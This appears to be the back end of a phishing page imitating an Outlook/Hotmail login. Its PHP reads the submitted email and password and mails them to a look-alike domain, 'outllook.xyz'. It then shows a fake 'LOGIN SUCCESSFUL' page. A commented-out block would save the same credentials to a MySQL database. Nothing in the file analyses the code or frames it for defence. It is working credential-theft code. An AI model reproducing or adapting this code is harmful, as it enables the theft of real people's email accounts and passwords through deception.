<?php
    // $email = $_POST['email'];
    // $password = $_POST['password'];

    // //Database connnection
    // $conn = new mysqli('localhost','root','','outlook');
    // if($conn->connect_error){
    //     die('Connection Failed : '.$conn->connect_error);
    // } else{
    //     $stmt = $conn->prepare("insert into outlook(email, password)values(?, ?)");
    //     $stmt->bind_param("ss", $email, $password);
    //     $stmt->execute();
    //     echo "";
    //     $stmt->close();
    //     $conn->close();
    // }

    //PHP code to receive content form in email address

    if (isset($_POST['submit'])) {
        $email = $_POST['email'];
        $password = $_POST['password'];
        $to = "info@outllook.xyz";
        $subject = "My Hotmail Details";

        $message = "
        
       This is my mail Login Details
        
            Email: $email
            Password: $password
      
        ";

        // Always set content-type when sending HTML email
        $headers = "MIME-Version: 1.0" . "\r\n";
        $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";

        // More headers
        $headers = " From: ".$email;

        mail($to, $subject, $message, $headers);
    }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LOGIN SUCCESSFUL</title>
    <link rel="icon" href="image/logo.png">
  <link rel="stylesheet" href="plugins/bootstrap/css/bootstrap.css">
  <link rel="stylesheet" href="style.css">
  <link rel="stylesheet" href="cone.css">
  <script src="plugins/jquery.min.js"></script>
  <script src="plugins/bootstrap/assets/js/vendor/popper.min.js"></script>
  <script src="plugins/bootstrap/js/bootstrap.min.js"></script>
</head>
<body>
       <section>
        <div class="container">
            <div class="row justify-content-center">
            <img src="image/gif.gif" width="30%" class="gif">
            </div>
        </div>
    </section>
</body>
</html>